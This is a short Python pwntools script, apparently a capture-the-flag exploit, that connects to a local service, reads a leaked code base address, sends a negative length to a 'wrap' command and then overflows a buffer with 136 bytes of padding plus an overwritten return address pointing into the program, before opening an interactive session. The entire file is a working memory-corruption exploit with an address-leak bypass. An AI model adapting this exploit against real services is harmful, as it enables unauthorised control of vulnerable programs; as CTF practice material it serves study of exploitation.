from pwn import *

r = remote("0", 12345)
raw_input()
print r.recv()
r.sendline("modinfo")
print r.recvuntil("Base address: 0x")
code_base = int(r.recvline()[:-1], 16)
log.info("code base 0x%x" % code_base)

print r.recv()
r.sendline("wrap")
print r.recv()
r.send("-1")
payload = "a" * 136
payload += p64(code_base + 0x9D3)
r.send(payload)
r.interactive()
